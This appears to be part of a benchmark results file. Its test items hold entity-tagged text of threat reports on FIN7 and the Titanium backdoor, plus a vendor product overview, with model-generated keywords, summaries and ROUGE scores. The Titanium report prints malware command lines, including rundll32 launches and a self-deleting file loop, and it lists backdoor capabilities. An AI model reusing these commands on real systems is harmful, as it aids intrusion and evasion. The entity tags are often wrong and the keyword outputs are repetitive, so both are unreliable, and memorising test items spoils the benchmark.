unusual backdoor; PowerShell; POWERPLANT; their first stage malware; LOADOUT; GRIFFON; newer intrusions; a new Backdoor; BIRDWATCH downloader; CROWVIEW; FOWLGAZE; time; FIN7 activity; attribution; scalability; the ransomware ecosystem; malicious code; additional groups; the group.", "ref_text": "<START-1> The PDF is a report by Mandiant detailing the evolution and recent activity of the financially-motivated threat group FIN7. Mandiant has been tracking FIN7 since 2017, and this report provides an update on their operations through 2021. Key points: FIN7 continues to be active, evolving their tactics, techniques, and procedures over time. Mandiant merged 8 previously separate threat clusters into FIN7 in early 2022 based on extensive analysis of overlaps in infrastructure, code, and tactics. FIN7 heavily leverages PowerShell in intrusions, reusing unique commands across campaigns. They developed a PowerShell backdoor called POWERPLANT which is under active development. FIN7 has diversified initial access techniques, now also using supply chain compromise and stolen credentials in addition to phishing. They often use the POWERPLANT backdoor as first stage malware now rather than LOADOUT/GRIFFON. While not directly attributing ransomware deployment to FIN7, there is evidence like shared infrastructure suggesting FIN7 relationships with various ransomware operations like DARKSIDE over time. FIN7 continues to rapidly modify tools like LOADOUT to evade detections, using obfuscation and packaging malware with things like Bible verses. In addition to core FIN7 activity, Mandiant tracks other clusters suspected to be associated like a \"BadUSB\" campaign distributing DICELOADER and phishing campaigns using BIRDWATCH. Despite 2018 indictments of some members, FIN7 continues to operate, targeting organizations across many industries with intrusions through 2021 and increased speed/scale. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.3925729442970822, "gpt3/lexical/rouge_rouge2": 0.10133333333333334, "gpt3/lexical/rouge_rougeL": 0.1962864721485411, "gpt3/lexical/rouge_rougeLsum": 0.1962864721485411, "gpt3_generated_text": ["This article discusses the evolution of the cybercriminal group FIN7 and their transition to targeted ransomware operations. The article highlights the group's use of new malware, initial access techniques, and monetization strategies. It also mentions the use of PowerShell and a new backdoor called POWERPLANT in their intrusions. The article suggests that FIN7 has been associated with various ransomware operations over time and identifies several campaigns that are suspected to be linked to the group. The article also discusses the attribution methodologies used by Mandiant to merge suspected FIN7 groups into their core cluster. It mentions the fluid nature of cybercriminal operations and the common practice of threat groups collaborating and adopting different tactics. The article concludes by discussing the group's activity in 2020 and the merger of several UNC groups into FIN7. Overall, the article provides insights into the activities and evolution of the FIN7 cybercriminal group."]}, {"split_name": "test", "sample_id": "test_51", "prompt_text": "Extract the keywords: [CARDINAL] 11/11/2019Titanium : the [ORG] Platinum group strikes again | SecurelistTitanium : the [ORG] Platinum group strikes againsecurelist.com/titanium-the-platinum-group-strikes-again/94961By [ORG] AMR , [ORG] GReAT on [DATE] November 8 , [DATE] 2019 . [TIME] 10:00 [TIME] amPlatinum is one of the most technologically advanced [ORG] APT actors with a traditional focus on the [ORG] APAC region . During recent analysis we discovered [ORG] Platinum using a new backdoor that we call Titanium ( named after a password to one of the self - executable archives ) . Titanium is the \ufb01nal result of a sequence of dropping , downloading and installing stages . The malware hides at every step by mimicking common software ( protection related , sound drivers software , DVD video During our research we found that the main targets of this campaign were located in [LOC] South and [LOC] Southeast [LOC] Asia . Introduction [ORG] The [ORG] Titanium [ORG] APT includes a complex sequence of dropping , downloading and installing stages , with deployment of a [GPE] Trojan - backdoor as the \ufb01nal step . Almost every level of the system mimics known software , such as security software , software for making DVD videos , sound drivers\u2019url the [ORG] Platinum group strikes again | Securelistsoftware etc . In every case the default distribution is:1 . an exploit capable of executing code as a [FAC] SYSTEM user [CARDINAL] 2 . a shellcode to download the next downloader [CARDINAL] 3 . a downloader to download an SFX archive that contains a [PRODUCT] Windows task installation script [CARDINAL] 4 . a password - protected SFX archive with a [GPE] Trojan - backdoor installer [CARDINAL] 5 . an installer script ( ps1 ) [CARDINAL] 6 . a [ORG] COM object [ORG] DLL ( a loader ) [CARDINAL] 7 . the [GPE] Trojan - backdoor itselfInfection vector We believe [ORG] the [ORG] Titanium [ORG] APT uses local intranet websites with a malicious code to start Another known way of spreading is the use of a shellcode that needs to be injected into a process . In this case it was winlogon.exe . Unfortunately , we do n\u2019t know how the shellcode was injected . See the shellcode description below . [CARDINAL] 2 \u2013 Wrapper DLLs Attackers make active use of various kinds of \u2018 wrappers \u2019 . Each wrapper is usually a COM [ORG] DLL , with the corresponding exported functions . The main purpose of these libraries is to decrypt and load an encrypted \ufb01le ( previously dropped somewhere ) into the system memory ( a payload ) and then redirect calls to the wrapper itself to the payload \u2019s exported functions . Another type of wrapper [ORG] DLL is designed to obtain a command line from its exported function argument passed by a caller and create a new process . [CARDINAL] 3 \u2013 Windows task installer ( SFX archive ) This is a password - encrypted SFX archive that can be downloaded via BITS Downloader . The password is hardcoded into the downloader that is used to decrypt the SFX archive using the -p command line argument . The main feature of this archive is that it contains the cURL executable code , compiled into a [ORG] DLL . Its purpose is to install the Windows task to establish persistence in the infected system . [CARDINAL] 4 \u2013 [ORG] Trojan - Backdoor installer ( SFX archive ) The backdoor itself uses an SFX archive which must be launched from the command line using a password to unpack it . All paths examples here and there will be for the DVD making software . However , these notes can be also applied to any other known software paths.url the [ORG] Platinum group strikes again | Securelist5 \u2013 BITS Downloader This component is used to download encrypted \ufb01les from the [ORG] C&C server then decrypt and The shellcode itself contains position - independent code and does n\u2019t require previously loaded libraries ( except [ORG] Kernel32.dll ) . Its sole purpose is to connect to the hardcoded [ORG] C&C address , download an encrypted payload ( the password - protected SFX archive ) , then decrypt and launch it using the hardcoded unpacking password . The usual command line is:1 \" [FAC] rundll32 \" $ [PRODUCT] temp\\IOZwXLeM023.tmp\",GetVersionInfo [PRODUCT] -t06xwsrdrub2i84n6map3li3vz3h9bh4vfgcw\"BITS [PRODUCT] Downloader [PRODUCT] description [WORK_OF_ART] The [WORK_OF_ART] BITS [WORK_OF_ART] Downloader is a [ORG] DLL \ufb01le which has [CARDINAL] only [CARDINAL] one exported function : GetVersionInfoA. The main purpose of this library is to download \ufb01les in encrypted form from the [ORG] C&C and launch them . Execution sequence The \ufb01rst thing the downloader does is to check whether it was started using the [FAC] SYSTEM user . If it was , it launches command line arguments ( that were passed to the binary loaded by the downloader [ORG] DLL ) using [PERSON] WMI.If it was n\u2019t started using the [FAC] SYSTEM user , the downloader passes command line arguments into the argument parser . -u URL - br GUIDParameter description Speci\ufb01es a URL address where system information will be sent An additional string that will be appended to a request string to the C&CCon\ufb01rmation URL where the downloader will send various con\ufb01rmations or request data . Possible to build in [CARDINAL] two additional con\ufb01rmation URLs Stop a payload downloading . The GUID parameter must provide a down\u2010 load task GUIDIf one of these parameters exists , the downloader will collect information about installed antivirus products and send it to the [ORG] C&C.url the [ORG] Platinum group strikes again | SecurelistAfter that , it sends the download request to the con\ufb01rmation URL . In response , the [ORG] C&C sends a \ufb01le that will be downloaded in the % USERPROFILE% directory . To decrypt the downloaded \ufb01le , the downloader uses an MD5 hash of the strings \u2019 encryption key . Con\ufb01rmation URL request and \ufb01le downloading This is the structure of the encrypted \ufb01le : typedef struct { byte hash[16 ] ; // md5 hash of the following data dword data_size ; byte data[data_size ] ; [CARDINAL] 9The downloader checks the hash \ufb01eld against a calculated MD5 of the data \ufb01eld hash , and if the hash is correct , performs the following actions : Appends an extension ( [ORG] DLL or [ORG] EXE , depending on data type ) Stores the downloaded \ufb01le in the % TMP% folder using the name % ( SystemTimeAsFileTime.dwLowDateTime).%TMPThen the downloader speci\ufb01es a command line to launch the downloaded \ufb01le . If the \ufb01le is a [ORG] DLL , the \ufb01nal command line will be:1 \" [PERCENT] % systemroot%\\system32\\rundll32.exe [PERCENT] % ( SystemTimeAsFileTime.dwLowDate\u2010Time)%.TMP,-peuwewh383eg -t 06xwsrdrub2i84n6map3li3vz3h9bh4vfgcw\"If the \ufb01le is an EXE \ufb01le:1 % ( SystemTimeAsFileTime.dwLowDateTime)%.TMP -peuwewh383eg -t06xwsrdrub2i84n6map3li3vz3h9bh4vfgcwAfter that , the downloader deletes itself using the following command line : url the [ORG] Platinum group strikes again | Securelist1 /c for /L % i in ( [CARDINAL] 1,1,100 ) do ( for /L % k in ( [CARDINAL] 1,1,100 ) do ( del /f /q module_path > NUL & if not exist module_path exit /b 0))File launching To launch the downloaded \ufb01le , the downloader uses the [ORG] WMI classes [PERSON] Win32_ProcessStartup , Win32_Process and their methods and \ufb01elds . File downloading using BITS To download a \ufb01le , the downloader uses the BITS service and its [ORG] COM interface , called IBackgroundCopyManager . It creates a task with the name [ORG] Microsoft [ORG] Download , then speci\ufb01es remote and local \ufb01le paths and timeouts . Windows task installation ( SFX archive with cURL ) It contains : Launches cURL and obfuscated ps1 scripts cURL executable compiled as a [ORG] DLL ( 7.50.3)Name Description f1.ps1 Will be executed after the \ufb01rst request to the [ORG] C&C ; decrypts x.dat f2.ps1 Will be executed after the [ORDINAL] second request to the [ORG] C&C ; decrypts b.dat e.ps1 Contains code that calculates a string for the [ORG] Authorization \ufb01eld of the HTTPheaderh.ps1 Gets information about the system proxy settings e.dllA [ORG] DLL \ufb01le with a single exported function ; calls CreateProcessAIt downloads : Source \ufb01le x.datDownloaded and de\u2010 crypted \ufb01le u.xmlb.dati.batThe result : DescriptionAES - encrypted \ufb01le ( see f1.ps1 for decryption algorithm ) AES - encrypted \ufb01le ( the same decryption algorithm)url the [ORG] Platinum group strikes again | SecurelistName Description i.batPerforms Windows task installationWhen a caller ( previous step ) executes this archive , it must specify [CARDINAL] two arguments : [ORG] Argument [ORG] Argument with a key to unpack the SFX archive Argument with a long string \u2013 AcceptanceID ( used in re\u2010 quests to the C&C)p.bat It launches the h.ps1 script to get information about system - wide proxy settings . After that it launches the e.ps1 script to calculate the SystemID that will be used in requests to the [ORG] C&C.To send a request , it uses c.dll ( which is cURL and has an exported function called [ORG] Command line arguments : Where : System - wide proxyParameter [PERSON] Description [PERSON] % p3%AcceptanceIDThis request downloads the [PRODUCT] x.dat \ufb01le , and the f1.ps1 script decrypts it into u.xml . After that it launches the next request . Request [CARDINAL] 2 Command line arguments : url the [ORG] Platinum group strikes again | SecurelistIt downloads the b.dat \ufb01le , and the f2.ps1 script decrypts it into i.bat ( using the same decryption After that , it launches the following command line to install the persistence task : The i.bat \ufb01le uses the previously decrypted [PERSON] u.xml \ufb01le as the task description . Trojan - backdoor installer The archive unpacks its \ufb01les into the following folder ( in the case of DVD making software):The archive itself contains : [ORG] DescriptionName [ORG] BabyBoyStyleBackground.wmv [ORG] Con\ufb01guration data psinstrc.ps1Trojan - backdoor loader [PERSON] Trojan - backdoor Loader installation scriptIn the case of the audio drivers software mimic , it differs only in its installation method compared to DVD making software : the ps1 script uses [CARDINAL] two known CLSIDs to replace their COM DLL paths with malicious ones . psinstrc.ps1 This is the installer script that registers DvDupdate.dll as the \u2018 DVDMaker Help \u2019 service , and sets its entry point as the DllGetClassObject name . It requires admin privileges to be executed correctly . The script contains con\ufb01gurable parameters , so it \u2019s easy to change any of the required parameters for different systems . There are [CARDINAL] two ways the loader can be installed : url the [ORG] Platinum group strikes again | SecurelistSystem service , with the DllGetClassObject exported function as the [ORG] ServiceMain function COM object , by replacing an existing CLSID registry path with its ownDvDupdate.dll This is a service [ORG] DLL , but with all the same exports you would expect from a [ORG] COM object . Basically , it \u2019s a payload loader . The whole code is obfuscated with different Windows API calls and loops . It was n\u2019t designed to confuse a reverse engineer or to make reverse engineering harder , but to bypass some simple AV emulation engines . The \ufb01rst exported function for every [ORG] COM object is DllGetClassObject . DllGetClassObject The loader creates a thread that decrypts the payload , restores its [ORG] PE and [ORG] MZ headers , and then loads it into memory and launches it . The payload is encrypted with AES [CARDINAL] 256 [ORG] CBC . The decryption key is hardcoded along with other encrypted strings . It does n\u2019t contain \u2018 MZ \u2018 and \u2018 PE \u2018 tags that allow it to bypass simple AV engines . After initializing the payload , the loader calls its function with ordinal [CARDINAL] 1 . nav_downarrow.png The payload , with backdoor functionality , is a [ORG] DLL \ufb01le . The malware functionality is in the \ufb01rst exported entry only . nav_downarrow.png \u2013 Ordinal 1 ( [GPE] Trojan - backdoor main function ) The \ufb01rst thing that it does is decrypt the other encrypted binary ( containing con\ufb01guration data ) from the [ORG] SFX content : The con\ufb01guration itself is divided into blocks , and every block has its own index . The payload uses these indices to get a speci\ufb01c item . The con\ufb01guration contains : the [ORG] C&C address traf\ufb01c encryption key the [ORG] UserAgent string other less important parametersExecution thread The execution thread is responsible for receiving commands from the [ORG] C&C server and sending responses . It contains an execution loop that starts by reading con\ufb01guration item # [MONEY] 00 to get the [ORG] C&C address.url the [ORG] Platinum group strikes again | SecurelistInitializing C&C communication To initialize the connection to the [ORG] C&C , the payload sends a base64 - encoded request that contains a unique SystemID , computer name , and hard disk serial number . After that , the malware starts receiving commands . Receiving commands To receive commands from the [ORG] C&C , the payload sends an empty request to the C&C. It uses the [ORG] UserAgent string from the con\ufb01guration and a special cookie generation algorithm to prepare a request . The malware can also get proxy settings from Internet Explorer . In response to this request , the [ORG] C&C answers with a [ORG] PNG \ufb01le that contains steganographically hidden data . This data is encrypted with the same key as the [ORG] C&C requests . The decrypted data contains backdoor commands and arguments for them . Examples of [ORG] PNG \ufb01les : [ORG] C&C command processor ( command descriptions ) The backdoor can accept many different commands , with the following among the most interesting : Read any \ufb01le from a \ufb01le system and send it to the C&C Drop or delete a \ufb01le in the \ufb01le system [PERSON] Drop a \ufb01le and run it Run a command line and send execution results to the [ORG] C&C [ORG] Update con\ufb01guration parameters ( except the AES encryption key ) Interactive mode \u2013 allows to the attacker to receive input from console programs and send their output at the C&CConclusions [ORG] The [ORG] Titanium [ORG] APT has a very complicated in\ufb01ltration scheme . It involves numerous steps and requires good coordination between all of them . In addition , none of the \ufb01les in the \ufb01le system can be detected as malicious due to the use of encryption and \ufb01leless technologies . [CARDINAL] One other feature that makes detection harder is the mimicking of well - known software.url the [ORG] Platinum group strikes again | [ORG] SecurelistRegarding campaign activity , we have not detected any current activity related to the Titanium APT.url", "generated_text": "the Platinum group; South and Southeast Asia; November; 2019; a new backdoor; Trojan-Backdoor; a password; SYSTEM users; a shellcode; a Windows task installation script; Windows task installer; the Trojan-Backdoor; DLL; a Windows task installer; the Windows task installer; the Trojan-Backdoor; a command line argument; the Windows task installer; the Trojan-backdoor; the system; Download; encrypted files; BITS Downloader; the C&C; a Windows task installer; an encrypted payload; the credentials; the malware; Trojan-Backdoor installer; the Trojan; the DLL; the system; Download; a Trojan-Backdoor; a Trojan; the Trojan; code; key; the system.", "ref_text": "<START-1>The PDF describes an advanced persistent threat (APT) group called Titanium, which is believed to be operated by the Platinum group. The main targets of Titanium are located in South and Southeast Asia. Titanium uses a complex multi-stage attack process to infiltrate target networks. It starts with an exploit to gain initial access, followed by multiple stages of downloaders, decryptors, and installers that eventually deploy a remote access trojan backdoor on the victim's system. Each stage of the attack chain mimics legitimate software to avoid detection. For example, the downloaders pretend to be security software, DVD authoring tools, or audio drivers. Encryption is used extensively to conceal malware files and network communications. The final payload is a backdoor that can receive commands from the command and control server to carry out actions like stealing files, executing commands, and uploading additional payloads. It uses steganography techniques to hide its traffic inside PNG image files. Persistence is achieved by installing the backdoor as a malicious service or hijacking COM objects. The backdoor configuration data reveals information like command and control addresses, encryption keys, and user agent strings. While active campaigns have not been recently observed, the complexity and sophistication of the Titanium operation shows how advanced adversaries are continually evolving their tactics, techniques, and procedures. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4639175257731959, "gpt3/lexical/rouge_rouge2": 0.09326424870466321, "gpt3/lexical/rouge_rougeL": 0.2525773195876289, "gpt3/lexical/rouge_rougeLsum": 0.2525773195876289, "gpt3_generated_text": ["In November 2019, the Platinum group, known for their advanced APT activities in the APAC region, was found using a new backdoor called Titanium. This malware, named after a password to one of the self-executable archives, is designed to target South and Southeast Asia. It follows a complex sequence of dropping, downloading, and installing stages, ultimately deploying a Trojan-backdoor. The infection vector includes the use of local intranet websites with malicious code and the injection of shellcode into processes. The malware also makes use of wrapper DLLs and a Windows task installer to establish persistence in the infected system. The BITS Downloader component is used to download and decrypt encrypted files from the C&C server. The malware's sole purpose is to connect to the C&C address, download an encrypted payload, decrypt and launch it using hardcoded unpacking passwords. The article provides a detailed description of the various components and stages involved in the operation of the Titanium APT, which targets the system using sophisticated techniques and encryption methods."]}, {"split_name": "test", "sample_id": "test_52", "prompt_text": "Extract the keywords: www.kaspersky.com/icsKaspersky Industrial CyberSecurity : solution overview [CARDINAL] 2019Attacks on industrial systems are on the increaseThree in [CARDINAL] four industrial companies say they believe they will experience an [ORG] ICS cyber attack and reasonably 77 % of companies rank cybersecurity as a major priority1 . Business and supply chain interruption has ranked as the number [CARDINAL] one risk concern globally for [DATE] the [DATE] past [DATE] six [DATE] years ; cyber incident ranked [ORDINAL] second in [DATE] 20182 . For businesses operating industrial or critical infrastructure systems , the risks have never been greater . [PERCENT] 40 % of industrial companies say the disruption of operations would be the most critical consequence of a cyberattack3 . Industrial security has consequences that reach far beyond business and reputational protection . When it comes to protecting industrial systems from cyberthreats , there are specific and significant ecological , social and macro - economic [LOC] considerations.1 The state of industrial [GPE] cybersecurity2018 , Kaspersky2 Allianz Risk Barometer 2018 3 PwC : The Global State of [ORG] InformationSecurity , [CARDINAL] 2018Operational technology vs. information technology As defined by automation standard IEC 62443 , an [ORG] Industrial [ORG] Control [ORG] System ( [ORG] ICS ) is a collection of personnel , hardware , and software that can affect or influence the safe , secure , and reliable operation of an industrial ( technological ) process . [ORG] Industrial [ORG] Control [ORG] Systems include but are not limited to:\u2022 [ORG] Distributed [ORG] Control [ORG] Systems ( DCSs ) , Programmable Logic Controllers ( PLCs ) , [PERSON] Remote [PERSON] TerminalUnits ( RTUs ) , [ORG] Intelligent [ORG] Electronic [ORG] Devices ( IEDs ) , [ORG] Supervisory [ORG] Control And [ORG] Data [ORG] Acquisition ( [ORG] SCADA ) and diagnostic systems.\u2022 Associated internal , human , network , or machine interfaces used to provide control , safety , and manufacturing operational functionality to continuous , batch , discrete , and other processes . In more high - level terms , any industrial systems infrastructure can be broken down into [CARDINAL] two domains:\u2022 Information Technology ( IT ) \u2013 systems required for managing data in the context of business goals [ORG] \u2022 [ORG] Operational [ORG] Technology ( OT ) \u2013 systems required for managing the physical , industrial processesof industrial automation . IT security strategies tend to focus on data protection , and to follow the objectives of the \u201c C - I - A \u201d model : [ORG] Data [ORG] Confidentiality , Integrity and Availability . However , for most [ORG] OT systems , cybersecurity is not about \u201c data \u201d but about the continuity of industrial processes . So , in terms of the C - I - A model , \u201c availability \u201d is a main focus of security strategies as applied to OT . This is what distinguishes industrial cybersecurity needs from those of other systems , meaning that the even most effective classical IT cybersecurity solution is inappropriate for use on [ORG] OT systems , putting the availability ( and in some cases the integrity ) of processes at risk.1Risks and threats Despite a growing awareness of the prevalence of cyber - based attacks on industrial control systems , many IT security models continue to adhere to the outdated belief that physically isolating systems ( through \u201c airgaps \u201d ) and \u201c security by obscurity \u201d is enough . It \u2019s not \u2013 in the era of Industry 4.0 , most non - critical industrial networks are accessible via the internet4 , whether or not by choice . Extensive research by [ORG] Kaspersky [ORG] ICS [ORG] CERT , using data from [ORG] the [ORG] Kaspersky [ORG] Security [ORG] Network , indicates that industrial PCs are regularly attacked by the same generic malware that afflicts business systems ( IT ) , including ( but not limited to ) well - known culprits such as trojans , viruses and worms . In [DATE] the [DATE] first [DATE] half [DATE] of [DATE] 2018 , [ORG] Kaspersky products across the globe blocked attempted malware attacks on 41.2 % of all [ORG] Kaspersky - protected computers classified as components of industrial infrastructure5.Another rising threat to the [ORG] ICS is ransomware . The range and diversity of ransomware escalated massively [DATE] between [DATE] 2015 [DATE] and [DATE] 2017 . The emergence of ransomware is highly significant for the industrial sector \u2013 such infections cause high - impact , wide - ranging damage to critical systems , making the [ORG] ICS a particularly attractive potential target \u2013 as proven by numerous incidents of ransomware attacks ( especially [ORG] WannaCry and exPetr infections ) hitting ICS/ [NORP] SCADA systems during [DATE] 2017 . In the near future ransomware designed to attack industrial systems may have its own specific agenda \u2013 instead of encrypting data , the malware may set out to disrupt operations or to block access to a key asset . As well as generic threats , industrial security must contend with [ORG] ICS - specific malware and targeted attacks : Stuxnet , [PERSON] Havex , [ORG] BlackEnergy , [ORG] Industroyer , and infamous [GPE] Triton that targets [ORG] Safety [ORG] Instrumented [ORG] System \u2013 the list is growing rapidly . As the Stuxnet and [ORG] BlackEnergy attacks have shown , [CARDINAL] one infected [ORG] USB drive or single spear - phishing email is all it takes for well - prepared attackers to bridge the air gap and penetrate an isolated network . In addition to malware and targeted attacks , industrial organizations face other threats and risks targeting people , processes and technology \u2013 and underestimating these risks can have serious consequences . Kaspersky develops solutions and services to help our customers tackle and manage not only malware and targeted attacks but also many other cyber incidents and risk factors , such as:\u2022 Mistakes by [ORG] SCADA operators or contractors ( serviceproviders)\u2022 [PERSON] Fraudulent actions \u2022 Lack of awareness and hard data for forensic investigation4 [ORG] ICS and their online availability [DATE] 2016 , Kaspersky 5 Threat Landscape for [ORG] Industrial [ORG] Automation [ORG] Systems for H1 [DATE] 2018 , [PERSON] Kaspersky [PERSON] ICS CERT2The need for specialized industrial cybersecurity Only cybersecurity vendors who understand the differences between cyber - physical enterprises and data - oriented enterprises can deliver solutions that meet the unique security needs of industrial enterprises . Arc Advisory emphasize that [PERSON] Kaspersky performs the unique combination of threat intelligence , machine learning , and human expertise that supports agile protection against any kind of threat6.Meanwhile , a well chosen solution could help to meet the business needs , provide a high ROI for organization and mitigate the operational risks.7Kaspersky : trusted industrial cybersecurity providerA representative vendor in cybersecurity and industrial protection8 , [PERSON] Kaspersky is continually researching and developing solutions that do more to address constantly evolving threats to industrial and critical infrastructures . From operations management to the [ORG] ICS level and beyond , [PERSON] Kaspersky is playing a leading role in helping industry , regulators and government agencies globally to anticipate changes in the threat landscape and to defend against attacks . A trusted security provider and partner to leading industrial organizations who have relied for [DATE] many [DATE] years on our anti - malware protection , [ORG] Kaspersky collaborates with well - recognized industrial automation vendors and organizations , including [ORG] Emerson , [GPE] SAP , [ORG] Siemens , [ORG] Schneider [ORG] Electric , [ORG] Industrial [ORG] Internet [ORG] Consortium and others , to establish compatibility , specialized procedures and co - operation frameworks which protect industrial environments from existing and emerging threats , including highly targeted attacks . [PERSON] Kaspersky has developed a portfolio of specialized solutions to address specific industrial cybersecurity market needs \u2013 Kaspersky Industrial CyberSecurity ( [ORG] KICS ) . Aimed to provide a holistic approach to industrial cybersecurity , [PERSON] Kaspersky [PERSON] Industrial [PERSON] CyberSecurity brings value on any stage of the customer \u2019s OT security process \u2013 from cybersecurity assessment and training to advanced technologies and incident response . In [DATE] 2018 Kaspersky was mentioned in [PERSON] Gartner report \u201c [WORK_OF_ART] Competitive [WORK_OF_ART] Landscape : [WORK_OF_ART] Operational [WORK_OF_ART] Technology [WORK_OF_ART] Security \u201d as a representative vendor in [CARDINAL] 4 categories:\u2022 [ORG] OT [ORG] Endpoint security , [ORG] \u2022 [ORG] OT [ORG] Network [ORG] Monitoring [ORG] and Visibility , [ORG] \u2022 [ORG] Anomaly [ORG] Detection , Incident Response and Reporting , \u2022 OT Security Services9.36 Arc Advisory : Kaspersky Moves Forward with [ORG] Improved [ORG] Cybersecurity [ORG] Solutions , 2018 7 Forrester Research : [ORG] The [ORG] Total [ORG] Economic [ORG] Impact \u2122 of [ORG] Kaspersky [ORG] Industrial [ORG] CyberSecurity , [DATE] April [DATE] 2019 . url forrester - tei - for - kics [ORG] 8 [ORG] Gartner [ORG] Market [ORG] Guide [ORG] for [ORG] Operational [ORG] Technology [ORG] Security , [DATE] July [DATE] 2018 9 Gartner : [PERSON] Competitive [PERSON] Landscape : Operational Technology Security , [DATE] October [DATE] 2018Read the full [PERSON] Gartner report : url [ORG] KICS - cited - in - Gartner- competitive - landscape - OT- securityKaspersky Industrial [ORG] CyberSecurity componentsKaspersky Industrial CyberSecurityPRODUCTSSERVICESIndustrial Endpoint Industrial EndpointProtection ProtectionIndustrialAnomaly andBreach [ORG] DetectionCentralized securitymanagementTrainingand awarenessExpert services andintelligenceKICS for [ORG] CyberSecurity : servicesOur suite of services forms an important part of the [ORG] KICS portfolio \u2013 we provide the full cycle of security services , from industrial cybersecurity assessment to incident response . Training and awareness \u2022 Trainings : Kaspersky offers training courses designed forcybersecurity experts and [ORG] OT managers / [ORG] ICS operators , e.g. during \u201c [WORK_OF_ART] Advanced [WORK_OF_ART] Industrial [WORK_OF_ART] Cybersecurity [WORK_OF_ART] in [WORK_OF_ART] Practice \u201d training , participants gain an insight into relevant cyberthreats , their developmental trends and the most effective methods to protect against them . Skill - development courses also enable security professionals to further develop their skills in specific areas , including [ORG] ICS [ORG] Penetration [ORG] Testing [ORG] and [ORG] Digital [ORG] Forensics.\u2022 [ORG] Awareness [ORG] Programs : To increase awareness of relevant industrial cybersecurity issues , as well as fostering the skills needed to address and resolve them , [PERSON] Kaspersky offers training games for security managers and engineers . For example , [ORG] Kaspersky [ORG] Industrial [ORG] Protection [ORG] Simulation ( KIPS ) simulates real - world cyber attacks on industrial automation systems , demonstrating the main issues associated with industrial cybersecurity provision.4Expert services \u2022 Cybersecurity Assessment : For organizations concernedabout the potential operational impact of IT / OT security , [PERSON] Kaspersky provides minimally invasive industrial cyber security assessment . A crucial [ORDINAL] first step in establishing security requirements within the context of operational needs , this can also provide significant insight into cybersecurity levels , even without further deployment of protection technologies.\u2022 [ORG] Threat [ORG] Intelligence : Up - to - date analytics , collected [ORG] byKaspersky experts , help to enhance customers \u2019 cyber protection from targeted industrial cyber attacks . Provided as TI feeds or reports , it meets specific customer needs by regional , industry and [ORG] ICS software parameters.\u2022Incident [ORG] Response : In the event of a cybersecurity incident , our experts will collect and analyze data , reconstruct the incident timeline , determine possible sources and motivation , and develop a remediation plan . In addition , [PERSON] Kaspersky offers a malware analysis service \u2013 within its framework , [PERSON] Kaspersky experts will categorize any malware sample provided , analyze its functions and behavior , and develop recommendations and a plan for its removal from your systems and for rolling back any malicious actions . [PERSON] Kaspersky [PERSON] Industrial [PERSON] Kaspersky [PERSON] Security [PERSON] Center To ensure the highest levels of protection from all attack vectors , security on the industrial floor should operate at both node and network levels . To ensure optimal control , ease of management and visibility , [ORG] KICS \u2013 like all Kaspersky protection technologies \u2013 is controlled via a single management console , [ORG] Kaspersky [ORG] Security [ORG] Center , enabling:\u2022 [PRODUCT] Centralized management of security policies - the abilityto set different protection settings for different nodes and groups.\u2022 Facilitated testing of updates before roll - out onto the network , ensuring full process integrity.\u2022 [GPE] Role - based access aligned with security policies and urgentactions . [ORG] Kaspersky [ORG] Security [ORG] Center ensures ease of control and visibility not only for industrial layers at multiple sites , but across the surrounding business floors , as illustrated below.5Kaspersky [ORG] Industrial [ORG] CyberSecurity components deploymentKaspersky Lab softwareO(cid:30)ice NetworkPlant DMZ NetworkSCADA / DCS NetworkControl NetworkFieldbusInternetKaspersky for [ORG] NodesPLCPLCSPANKICS for NodesKICS for NetworksKaspersky Security Gateway KICS can also send event - related data to other systems , such as SIEMs , MESs and [ORG] Business [ORG] Intelligence solutions . All detected events and anomalies are reported to [ORDINAL] 3rd party systems \u2013 including [ORG] SIEM , mail , syslog servers and network management systems \u2013 through [ORG] CEF [ORG] 2.0 , [ORG] LEEF and [NORP] Syslog protocols . As well as helping detect , counter and investigate cyber attacks , detailed industrial network monitoring supports predictive maintenance . Integration with Human - Machine Interfaces ( HMIs ) The solution can send security notifications directly to HMIs , providing industrial floor workers with specific information for immediate reaction to and escalation of the cyber incident.6Kaspersky [ORG] Industrial [ORG] CyberSecurity for NodesAs an industrial endpoint protection software , [ORG] KICS for Nodes was designed to specifically address threats at operator level in [ORG] ICS environments . It secures [ORG] ICS / SCADA servers , HMIs and engineering workstations from the various types of cyberthreat that can result from human factors , generic malware , targeted attacks or sabotage . [ORG] KICS for Nodes is compatible with both the software and hardware components of industrial automation systems , such as [ORG] SCADA , [ORG] PLC and DCS.Threats and risks factorsKaspersky technologiesUnauthorized software executionWhitelisting ; prevention or detection - only ( registration rather than blocking ) modesMalwareCryptors , including ransomwareNetwork attacksUnauthorized device connectionUnauthorized wireless connectionsAdvanced anti - malware signature - based detection engines ; Cloud based detection engine , which uses [PERSON] Kaspersky public cloud ( [ORG] KSN ) or private cloud ( KPSN ) File Integrity MonitorAnti - cryptorHost - based firewall [ORG] Memory [ORG] Protection ( Exploit Prevention ) , [ORG] Log [ORG] InspectorDevice controlWi - Fi network controlPLC programs spoofPLC integrity checkICS specifics \u2014 airgaps ; false positives for [ORG] ICS software / process , etc . Trusted updates , which tested with software of leading industrial vendors ; certification of product by leading industrial automation vendors . Application whitelisting The relatively static nature of [ORG] ICS endpoint configurations means integrity control measures are significantly more effective than in dynamic , corporate networks . Integrity control technologies featured in [ORG] KICS for Nodes include:\u2022 Control of application installation and start - up accordingto whitelisting ( best practice for industrial control networks ) or blacklisting policies.7\u2022 Control of application access to operating system resources : files , folders , system registry etc.\u2022 Control of all types of executable running in [GPE] Windowsenvironments , including .exe , .dll , .ocx , drivers , ActiveX , scripts , command line interpreters and kernel - mode drivers.\u2022 Updating of application reputation data . \u2022 Pre - defined and customer - defined application categoriesto manage controlled application lists.\u2022 Fine - tuning of application controls for different users . \u2022 Prevention or detection - only modes : blocking any applicationthat is n\u2019t whitelisted or , in \u201c watching \u201d mode , allowing applications which are n\u2019t whitelisted to run , but registering this activity in [ORG] Kaspersky [ORG] Security [ORG] Center , where it can be assessed . Device control Management of access to removable devices , peripherals and system busses , based on device category , family and specific device ID.\u2022 Support for both whitelisting and blacklisting approaches . \u2022 Granular , per - computer , per - user policy assignment to a singleuser / computer or group of users / computers.\u2022 Prevention or detection - only mode . Host - based firewall Set - up and enforcement of network access policies for protected nodes such as servers , HMIs or workstations . Key functionality includes:\u2022 Control of access over restricted ports and networks . \u2022 Detection and blocking of network attacks launched frominternal sources , such as contractor laptops , which may introduce malware that attempts to scan and infect the host as soon as it joins 